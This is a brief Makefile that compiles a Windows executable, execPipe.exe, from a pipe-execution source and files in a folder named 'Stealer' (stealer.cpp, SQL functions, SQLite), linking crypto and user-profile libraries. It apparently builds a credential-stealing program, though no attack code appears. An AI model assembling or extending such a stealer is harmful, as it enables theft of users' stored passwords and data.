CC=gcc
CXX=g++
LDFLAGS=  -static -lshell32  -lshlwapi -lcrypt32 -lbcrypt -lUserenv

execPipe:
	$(CXX)  exec_with_pipe.cpp ..\Stealer\stealer.cpp ..\Stealer\SQLfunctions.cpp ..\Stealer\sqlite3.o $(LDFLAGS) -o execPipe.exe 